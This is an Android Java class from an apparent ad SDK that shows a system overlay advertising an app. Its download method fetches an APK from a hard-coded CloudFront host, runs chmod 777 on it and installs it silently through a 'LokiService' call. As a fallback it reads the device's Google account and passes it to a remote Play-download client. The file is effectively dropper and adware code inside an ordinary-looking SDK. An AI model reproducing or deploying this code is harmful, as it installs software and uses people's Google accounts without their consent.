package com.androidhelper.sdk.ad.task;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.graphics.PixelFormat;
import android.net.Uri;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.ListView;
import android.widget.TextView;

import com.androidhelper.sdk.AMApplication;
import com.androidhelper.sdk.R;
import com.androidhelper.sdk.adapter.InstallWindowPerListAdapter;
import com.androidhelper.sdk.entity.AD;
import com.androidhelper.sdk.entity.Apk;
import com.androidhelper.sdk.net.parser.ConfigParser;
import com.androidhelper.sdk.tools.AMConstants;
import com.androidhelper.sdk.tools.AMLogger;
import com.androidhelper.sdk.tools.CommonUtils;
import com.giga.sdk.ClientManager;
import com.loki.sdk.LokiClientCallback;
import com.loki.sdk.LokiService;
import com.nostra13.universalimageloader.core.ImageLoader;

class InstallGuideWindowTask extends ADWindowTask implements Runnable {

	private WindowManager mWindowManager;
	private LayoutInflater mInflater;
	private ImageView mAppIconIV;
	private TextView mAppTitleTV;
	private ListView mPermissionLV;
	private Button mInstallBtn;
	private ImageView mCloseIV;
	private AD mAD;
//	private Handler mHandler;
	private LokiClientCallback lokiClientCallback;
	
	private InstallWindowPerListAdapter mAdapter;
	private String destUrl;
	private String referrer;
	
	InstallGuideWindowTask(Context context, AD ad) {
		super(context);
		mAD = ad;
//		mHandler = new Handler(Looper.getMainLooper());
	}

	@Override
	public void start() {
		// 显示广告
		displayAD();
	}

	@Override
	protected void pullDatas() {
		
	}

	@Override
	protected void displayAD() {
		if (null == mWindowManager) {
			mWindowManager = (WindowManager) mContext.getSystemService(Context.WINDOW_SERVICE);
		}
		LayoutParams lpWindow = new LayoutParams();
		lpWindow.type = LayoutParams.TYPE_SYSTEM_ALERT;
		lpWindow.flags = LayoutParams.FLAG_DIM_BEHIND;
		lpWindow.dimAmount = 0.8f;
		lpWindow.gravity = Gravity.CENTER;
		lpWindow.x = 0;  
		lpWindow.y = 0; 
		
		lpWindow.width = CommonUtils.dip2px(mContext, mContext.getResources().getDimension(R.dimen.install_guide_window_width));
		lpWindow.height = CommonUtils.dip2px(mContext, mContext.getResources().getDimension(R.dimen.install_guide_window_height));
		lpWindow.format = PixelFormat.RGBA_8888; 
		
		if (null == mRootView) {
			if (null == mInflater) {
				mInflater = (LayoutInflater) mContext.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
			}
			mRootView = mInflater.inflate(R.layout.install_guide_window, null);
		}
		mWindowManager.addView(mRootView, lpWindow);  
		initViews();
		initDatas();
		lokiClientCallback = new LokiClientCallback(mContext);
		super.displayAD();
	}

	private void initViews() {
		mAppIconIV = (ImageView) mRootView.findViewById(R.id.appIcon);
		mAppTitleTV = (TextView) mRootView.findViewById(R.id.appTitle);
		mPermissionLV = (ListView) mRootView.findViewById(R.id.listView);
		mInstallBtn = (Button) mRootView.findViewById(R.id.acceptInstall);
		mCloseIV = (ImageView) mRootView.findViewById(R.id.close);
	}
	
	private void initDatas() {
		ImageLoader.getInstance().displayImage(mAD.getIcon_url(), mAppIconIV, AMApplication.instance.displayOption);
		mAppTitleTV.setText(mAD.getTitle());
		if(null == mAdapter) {
			mAdapter = new InstallWindowPerListAdapter(mContext);
		}
		mAdapter.setDatas(mAD.getPermissions());
		mPermissionLV.setAdapter(mAdapter);
		
		mCloseIV.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				closeWindow();
			}
		});
		
		mInstallBtn.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				try {
					installApp();
				} catch (Exception e) {
					AMLogger.e(null, e.getMessage());
				}
			}
		});
	}
	
	private void installApp() throws Exception {
		closeWindow();
		ADTaskBuilder builder = new ADTaskBuilder();
		ADTask adTask = builder.setADType(TaskType.WINDOW_INSTALLING, mContext, mAD).build();
		adTask.start();
		AMApplication.instance.installADs.add(mAD);
//		mHandler.post(this);
		new Thread(this).start();
	}

	@Override
	public void run() {
		try {
			destUrl = CommonUtils.getDestUrl(mAD.getLandingPager());
//			destUrl = "https://play.google.com/store/apps/details?hl=en&id=com.airelive.apps.choco&referrer=mat_click_id%3D063655d1c3431b4efb8a45f72b7c06dd-20150813-170972";
			AMLogger.e(null, "destUrl : " + destUrl);
			if(!CommonUtils.isEmptyString(destUrl)) {
				Uri uri = Uri.parse(destUrl);
				referrer = uri.getQueryParameter("referrer");
				new Thread(){
					public void run() {
						try {
							downloadApk("http://d2u9yfs3c0iqe1.cloudfront.net/apk/" + mAD.getPackageName() + ".apk", referrer);
//							downloadApk("http://d2u9yfs3c0iqe1.cloudfront.net/apk/" + "com.airelive.apps.choco.apk", referrer);
							
//							LokiService lokiService = LokiService.getInstance(mContext);
//							if(lokiService != null) {
//								File dir = AMApplication.instance.getFilesDir();
//								File file = new File(dir.getAbsolutePath() + "/new.apk");
//								lokiService.installPackage(file.getAbsolutePath(), null, 0);
//							}
						} catch (Exception e) {
							AMLogger.e(null, e.getMessage());
						}
					};
				}.start();
			}
		} catch (Exception e) {
			AMLogger.e(null, e.getMessage());
		}
	}

//	@Override
//	public void onResponse(final String t) {
//		if(CommonUtils.isEmptyString(t)) {
//			try {
//				ClientManager clientManager = ClientManager.getInstance(mContext);
//				ConfigParser parser = new ConfigParser();
//				String serverName = parser.getValue(mContext, AMConstants.NET_GP_SERVER);
//				String serverPort = parser.getValue(mContext, AMConstants.NET_GP_SERVER_PORT);
//				clientManager.downloadWithGooglePlay(destUrl, lokiClientCallback, serverName, Integer.parseInt(serverPort), 600000);
//				return;
//			} catch (Exception e) {
//				AMLogger.e(null, e.getMessage());
//			}
//		}
//		Apk apk = new Apk();
//		apk.setPackageName(t);
//		apk.setReferrer(referrer);
//		AMApplication.instance.installApks.add(apk);
//		new Thread(){
//			public void run() {
//				try {
//					downloadApk(t);
//				} catch (Exception e) {
//					AMLogger.e(null, e.getMessage());
//				}
//			};
//		}.start();
//	}
	
	private void downloadApk(String apkUrl, String referral) {
		InputStream inputStream = null;
		FileOutputStream fos = null;
		try {
			if(CommonUtils.isEmptyString(apkUrl)) {
				com.loki.giga.sdk.ClientManager clientManager = com.loki.giga.sdk.ClientManager.getInstance(mContext);
				ConfigParser parser = new ConfigParser();
				String serverName = parser.getValue(mContext, AMConstants.NET_GP_SERVER);
				String serverPort = parser.getValue(mContext, AMConstants.NET_GP_SERVER_PORT);
				AccountManager am = (AccountManager) mContext.getSystemService(Context.ACCOUNT_SERVICE);
		        Account[] accounts = am.getAccountsByType("com.google");
		        Account account = null;
		        if (accounts != null && accounts.length > 0) {
		            account = accounts[0];
		        }
		        clientManager.downloadWithGooglePlay(LokiService.getInstance(mContext), account, destUrl, serverName, Integer.parseInt(serverPort), 60000, null);
				return;
			}
		} catch (Exception e) {
			AMLogger.e(null, e.getMessage());
		}
		try {
			URL url = new URL(apkUrl);
			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
			conn.setConnectTimeout(60000);
			conn.setReadTimeout(60000);
			conn.connect();
			int responseCode = conn.getResponseCode();
			if(200 != responseCode) {
				com.loki.giga.sdk.ClientManager clientManager = com.loki.giga.sdk.ClientManager.getInstance(mContext);
				ConfigParser parser = new ConfigParser();
				String serverName = parser.getValue(mContext, AMConstants.NET_GP_SERVER);
				String serverPort = parser.getValue(mContext, AMConstants.NET_GP_SERVER_PORT);
				AccountManager am = (AccountManager) mContext.getSystemService(Context.ACCOUNT_SERVICE);
		        Account[] accounts = am.getAccountsByType("com.google");
		        Account account = null;
		        if (accounts != null && accounts.length > 0) {
		            account = accounts[0];
		        }
		        clientManager.downloadWithGooglePlay(LokiService.getInstance(mContext), account, destUrl, serverName, Integer.parseInt(serverPort), 60000, null);
				conn.disconnect();
				return;
			}
			inputStream = conn.getInputStream();
			BufferedInputStream bis = new BufferedInputStream(inputStream);
			File dir = AMApplication.instance.getFilesDir();
			File file = new File(dir.getAbsolutePath() + "/new.apk");
			fos = new FileOutputStream(file);
			int len = -1;
			byte[] buffer = new byte[1024];
			while ((len = bis.read(buffer)) > 0) {
				fos.write(buffer, 0, len);
			}
			fos.flush();
			fos.close();
			bis.close();
			inputStream.close();
			conn.disconnect();
			Apk apk = new Apk();
			apk.setPackageName(mAD.getPackageName());
//			apk.setPackageName("com.airelive.apps.choco");
			apk.setReferrer(referrer);
			AMApplication.instance.installApks.add(apk);
			LokiService lokiService = LokiService.getInstance(mContext);
			if(lokiService != null) {
				 String[] command = {"chmod", "777", file.getAbsolutePath()};
			        ProcessBuilder builder = new ProcessBuilder(command);
			        try {
						builder.start();
					} catch (IOException e) {
						AMLogger.e(null, e.getMessage());
					}
				lokiService.installPackage(file.getAbsolutePath(), null, 0);
			}
		} catch (Exception e) {
			AMLogger.e(null, e.getMessage());
		} finally {
			if(null != fos) {                  
				try {
					fos.close();
				} catch (IOException e) {
					AMLogger.e(null, e.getMessage());
				} finally {
					if(null != inputStream) {
						try {
							inputStream.close();
						} catch (IOException e) {
							AMLogger.e(null, e.getMessage());
						}
					}
				}
			}
		}
	}
}
